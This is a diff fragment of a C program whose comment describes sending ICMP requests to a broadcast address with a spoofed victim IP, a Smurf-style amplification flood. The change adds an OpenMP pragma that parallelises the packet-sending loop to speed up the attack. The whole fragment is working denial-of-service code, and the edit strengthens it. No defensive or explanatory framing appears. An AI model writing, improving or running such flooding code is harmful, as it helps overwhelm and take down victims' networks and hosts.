@@ -43,6 +43,7 @@ int main(int argc,char* argv[]){
 		
 		/** Application (Send icmp requests to broadcast addr with victim ip spoofed) **/
 		int count = 0,i;
+		#pragma omp parallel for reduction(+:count) if(iterations>=2000000)
 		for(i=0;i<iterations;i++){
 			if(sendto(sock, buffer, ip_hdr->total_length, 0, (struct sockaddr*)&myaddr, sizeof(myaddr))>=0) count++;
 		}
